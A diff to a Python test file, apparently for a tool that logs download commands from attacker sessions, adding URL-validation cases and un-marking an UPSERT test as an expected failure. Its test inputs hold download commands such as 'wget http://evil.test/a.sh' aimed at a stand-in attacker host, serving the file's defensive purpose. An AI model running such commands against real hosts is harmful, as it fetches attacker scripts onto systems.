@@ -30,6 +30,8 @@ def test_extract_commands_keeps_only_download_lines():
     ("evil.test/a.sh", False),
     ("http://", False),
     ("", False),
+    ("http://[::1", False),  # urlparse raises ValueError
+    ("ftp://evil.test/x", True),  # valid, evaluator reports it unreachable (requests cannot fetch it)
 ])
 def test_is_valid(url, valid):
     assert is_valid(url) is valid
@@ -93,8 +95,6 @@ def test_process_new_session_is_atomic(db, config, monkeypatch):
         assert db.execute(f"SELECT COUNT(*) FROM {table}").fetchone()[0] == 0, table
 
 
-@pytest.mark.xfail(strict=True, reason="BUG: process_new_session() uses cursor.lastrowid after an UPSERT; "
-                   "on conflict SQLite keeps the rowid of the previous insert, so known URLs are reported as new")
 def test_process_new_session_same_url_again_is_not_new(db, config):
     process_new_session(db, config, "wget http://evil.test/a.sh", None, "2026-01-01T10:00:00Z", "Warden", None)
     inserted = process_new_session(db, config, "curl http://evil.test/a.sh", None, "2026-01-02T10:00:00Z", "Warden", None)
